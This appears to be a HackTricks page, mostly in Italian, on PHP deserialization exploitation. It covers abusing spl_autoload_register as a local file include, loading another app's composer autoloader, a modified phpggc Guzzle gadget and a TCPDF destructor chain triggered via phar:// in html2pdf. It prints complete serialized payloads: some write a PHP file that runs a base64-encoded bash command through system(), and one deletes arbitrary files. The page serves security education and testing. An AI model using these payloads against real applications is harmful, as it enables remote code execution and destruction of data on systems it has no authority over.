# PHP - Deserialization + Autoload Classes

{{#include ../../banners/hacktricks-training.md}}

Prima di tutto, dovresti controllare cosa sono [**Autoloading Classes**](https://www.php.net/manual/en/language.oop5.autoload.php).

## PHP deserialization + spl_autoload_register + LFI/Gadget

Ci troviamo in una situazione in cui è stata trovata una **PHP deserialization in a webapp** senza alcuna libreria vulnerabile a gadget presente in **`phpggc`**. Tuttavia, nello stesso container c'era una **diversa webapp composer con librerie vulnerabili**. Di conseguenza, l'obiettivo era **caricare il composer loader dell'altra webapp** e abusarlo per **caricare un gadget che sfrutti quella libreria con un gadget** dalla webapp vulnerabile alla deserialization.

Steps:

- Hai trovato una **deserialization** e **non** ci sono gadget nel codice dell'app corrente
- Puoi abusare di una funzione **`spl_autoload_register`** come la seguente per **caricare qualsiasi file locale con estensione `.php`**
- Per questo usi una deserialization dove il nome della classe sarà dentro **`$name`**. Non puoi usare "/" o "." in un nome di classe in un oggetto serializzato, ma il **codice** sta **sostituendo** gli **underscores** ("\_") **con le slash** ("/"). Quindi un nome di classe come `tmp_passwd` sarà trasformato in `/tmp/passwd.php` e il codice tenterà di caricarlo.\
Un **esempio di gadget** sarà: **`O:10:"tmp_passwd":0:{}`**
```php
spl_autoload_register(function ($name) {

if (preg_match('/Controller$/', $name)) {
$name = "controllers/${name}";
} elseif (preg_match('/Model$/', $name)) {
$name = "models/${name}";
} elseif (preg_match('/_/', $name)) {
$name = preg_replace('/_/', '/', $name);
}

$filename = "/${name}.php";

if (file_exists($filename)) {
require $filename;
}
elseif (file_exists(__DIR__ . $filename)) {
require __DIR__ . $filename;
}
});
```
> [!TIP]
> Se hai un **file upload** e puoi caricare un file con **`.php` extension** puoi **abusare direttamente di questa funzionalità** e ottenere già RCE.
 
In my case, I didn’t have anything like that, but there was inside the **same container** another composer web page with a **library vulnerable to a `phpggc` gadget**.
 
- To load this other library, first you need to **load the composer loader of that other web app** (because the one of the current application won’t access the libraries of the other one.) **Knowing the path of the application**, you can achieve this very easily with: **`O:28:"www_frontend_vendor_autoload":0:{}`** (In my case, the composer loader was in `/www/frontend/vendor/autoload.php`)
- Now, you can **load** the others **app composer loader**, so it’s time to **`generate the phpgcc`** **payload** to use. In my case, I used **`Guzzle/FW1`**, which allowed me to **write any file inside the filesystem**.
- NOTE: The **generated gadget was not working**, in order for it to work I **modified** that payload **`chain.php`** of phpggc and set **all the attribute**s of the classes **from private to public**. If not, after deserializing the string, the attributes of the created objects didn’t have any values.
- Now we have the way to **load the others app composer loader** and have a **phpggc payload that works**, but we need to **do this in the SAME REQUEST for the loader to be loaded when the gadget is used**. For that, I sent a serialized array with both objects like:
- You can see **first the loader being loaded and then the payload**
```php
a:2:{s:5:"Extra";O:28:"www_frontend_vendor_autoload":0:{}s:6:"Extra2";O:31:"GuzzleHttp\Cookie\FileCookieJar":4:{s:7:"cookies";a:1:{i:0;O:27:"GuzzleHttp\Cookie\SetCookie":1:{s:4:"data";a:3:{s:7:"Expires";i:1;s:7:"Discard";b:0;s:5:"Value";s:56:"<?php system('echo L3JlYWRmbGFn | base64 -d | bash'); ?>";}}}s:10:"strictMode";N;s:8:"filename";s:10:"/tmp/a.php";s:19:"storeSessionCookies";b:1;}}
```
- Ora, possiamo **creare e scrivere un file**, tuttavia, l'utente **non poteva scrivere in nessuna cartella all'interno del web server**. Quindi, come puoi vedere nel payload, viene creato in **`/tmp/a.php`** un PHP che chiama **`system`** con un po' di **base64**. Poi, possiamo **riutilizzare il primo tipo di payload** che abbiamo usato come LFI per caricare il composer loader dell'altra webapp e includere il file generato **`/tmp/a.php`**. Basta aggiungerlo al deserialization gadget:
```php
a:3:{s:5:"Extra";O:28:"www_frontend_vendor_autoload":0:{}s:6:"Extra2";O:31:"GuzzleHttp\Cookie\FileCookieJar":4:{s:7:"cookies";a:1:{i:0;O:27:"GuzzleHttp\Cookie\SetCookie":1:{s:4:"data";a:3:{s:7:"Expires";i:1;s:7:"Discard";b:0;s:5:"Value";s:56:"<?php system('echo L3JlYWRmbGFn | base64 -d | bash'); ?>";}}}s:10:"strictMode";N;s:8:"filename";s:10:"/tmp/a.php";s:19:"storeSessionCookies";b:1;}s:6:"Extra3";O:5:"tmp_a":0:{}}
```
**Riepilogo del payload**

- **Load the composer autoload** di una diversa webapp nello stesso container
- **Load a phpggc gadget** per abusare di una libreria dell'altra webapp (la webapp iniziale vulnerabile a deserialization non aveva alcun gadget nelle sue librerie)
- Il gadget **create a file with a PHP payload** in /tmp/a.php con comandi malevoli (l'utente della webapp non può scrivere in nessuna cartella di alcuna webapp)
- La parte finale del nostro payload userà **load the generated php file** che eseguirà comandi

Ho dovuto **call this deserialization twice**. Nei miei test, la prima volta il file `/tmp/a.php` è stato creato ma non caricato, mentre la seconda volta è stato caricato correttamente.

## TCPDF `__destruct` POP chain per la cancellazione arbitraria di file

Quando una vera istanza di `TCPDF` viene raccolta dal garbage collector chiama `_destroy(true)`, itera su `$this->imagekeys` e richiama `unlink()` su tutto ciò che assomiglia a un file di cache sotto `K_PATH_CACHE`. Se un'applicazione esegue `unserialize($user_data)` mentre la classe `TCPDF` è caricata (es. si aspetta un array con una chiave `html`), puoi fornire un oggetto serializzato che imposta:

- `file_id` su un intero qualsiasi che non sia presente in `self::$cleaned_ids` (es. `-1`).
- `imagekeys` su percorsi che iniziano con `K_PATH_CACHE` o che possono essere fatti sembrare tali (es. `/tmp/../tmp/do_not_delete_this_file.txt` quando `K_PATH_CACHE` è `/tmp/`).

Esempio di payload che sfrutta un flusso insicuro `unserialize($_GET['p']); $pdf->writeHTML($payload['html']);`:
```text
a:1:{s:4:"html";O:5:"TCPDF":2:{s:7:"file_id";i:-1;s:9:"imagekeys";a:1:{i:0;s:39:"/tmp/../tmp/do_not_delete_this_file.txt";}}}
```
Il file viene eliminato non appena l'oggetto esce dallo scope. TCPDF 6.9.3 ha rafforzato il controllo per rimuovere solo i percorsi con il prefisso `__tcpdf_<file_id>_` all'interno di `K_PATH_CACHE` e ha introdotto `_unlink()` per bloccare gli schemi non-`file://`, quindi le versioni più vecchie di `Producer` sono obiettivi ideali.

### Scatenare il gadget via `phar://` nei tag `<cert>` di html2pdf

`spipu/html2pdf` (≤5.3.0) incapsula TCPDF ed espone un blocco `<cert>` personalizzato i cui attributi `src`/`privkey` sono validati con il semplice `file_exists()`. Su PHP < 8.0 qualsiasi funzione di filesystem che accede a un URL `phar://` provoca l'unserialize dei metadati Phar. Memorizzando l'oggetto TCPDF malevolo sopra dentro un archivio Phar si ottiene un POP affidabile anche se l'applicazione non chiama mai `unserialize()` direttamente.

1. Crea un Phar con `phar.readonly=0`, imposta lo stub/manifest in modo che assomigli a un'immagine (es. rinomina `archive.phar` in `archive.png`), e memorizza l'oggetto TCPDF serializzato nei metadati del Phar.
2. Carica/posiziona il file in un percorso raggiungibile come `/tmp/user_files/user_1/archive.png`.
3. Invia HTML contenente il tag `<cert>` affinché html2pdf risolva il percorso controllato dall'attaccante:
```html
<cert src="phar:///tmp/user_files/user_1/archive.png"
privkey="phar:///tmp/user_files/user_1/archive.png" />
```
La chiamata a `file_exists()` deserializza i metadati, istanzia TCPDF, e il suo distruttore elimina il file scelto, trasformando html2pdf in un potente entry point `phar://`. La versione 5.3.1 ha aggiunto `Security::checkValidPath()` per bloccare gli schemi non approvati, quindi le distribuzioni legacy restano appetibili.

## Riferimenti

- [Positive Technologies – Blind Trust: What Is Hidden Behind the Process of Creating Your PDF File?](https://swarm.ptsecurity.com/blind-trust-what-is-hidden-behind-the-process-of-creating-your-pdf-file/)

{{#include ../../banners/hacktricks-training.md}}
